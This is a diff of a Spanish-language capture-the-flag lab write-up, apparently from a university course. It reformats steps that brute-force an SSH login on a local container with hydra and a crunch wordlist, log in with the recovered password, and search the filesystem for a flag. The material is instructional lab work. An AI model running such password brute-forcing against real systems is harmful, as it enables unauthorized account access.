@@ -144,51 +144,50 @@ echo -e "esdeg\nESDEG\nEsdeg\neSdeg\nesDEG\neSdEg\nEsDEg\nESDeg\nesDEg\nEsdEg" >
 ```bash
 hydra -l legion -P combinadas.lst -s 2222 localhost ssh
 ```
-
-![Bang](Images/7.1%20BANG!%20.avif)
+![Bang](Images/bangbang-gun.gif)
 
 ## ✅ Resultado:
-
+```bash
 css
-
+```
 [22][ssh] host: localhost login: legion password: Esdeg
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## 🔐 8. Acceso SSH exitoso
 
-
+```bash
 ssh legion@localhost -p 2222
-# Contraseña: Esdeg
-🕵️ 9. Búsqueda de bandera
+```
+
+***Contraseña:** Esdeg*
+
+![Acces](Images/lukeafk-hacking.gif)
+
+## 🕵️ 9. Búsqueda de bandera
 
 ## *Comandos usados:*
 
+```bash
 ls -la
 cat flag.txt
 find / -name "*flag*" 2>/dev/null
 cat /etc/motd
 grep -r "CTF{" /home 2>/dev/null
+```
 
 ## ❌ No se encontró bandera explícita en el contenedor.
 
 ## 🧠 Lecciones aprendidas
-Uso táctico de crunch para generar diccionarios.
 
-Dominio de hydra con control de tareas (-t).
+>- Uso táctico de crunch para generar diccionarios.
+>- Dominio de hydra con control de tareas (-t).
+>- Verificación previa de puertos y servicio SSH.
+>- Importancia de considerar variantes en uso de mayúsculas.
+>- Documentación detallada del proceso paso a paso.
 
-Verificación previa de puertos y servicio SSH.
-
-Importancia de considerar variantes en uso de mayúsculas.
-
-Documentación detallada del proceso paso a paso.
-
-Contraseña final encontrada: Esdeg
-Usuario: legion
-Puerto: 2222
-
-📁 Autor: [grupo 4 - ]
-📅 Fecha: Julio 2025
-🎓 Proyecto académico – Electiva Habilidades Prácticas CTF
+**Contraseña final encontrada: Esdeg**
+**Usuario: legion**
+**Puerto: 2222**
 
 
